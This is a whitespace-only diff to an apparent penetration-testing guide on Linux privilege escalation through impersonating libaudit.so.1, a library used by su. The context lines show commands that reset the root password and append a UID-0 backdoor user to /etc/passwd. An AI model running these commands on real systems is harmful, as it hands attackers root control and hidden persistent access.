@@ -56,7 +56,7 @@ ldd /bin/su
         /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
 
-In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.  
+In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.\
 So, check for functions of this library used by the **`su`** binary:
 
 ```bash
@@ -115,5 +115,4 @@ echo "root:hacked" | chpasswd
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
 
-### 
-
+###
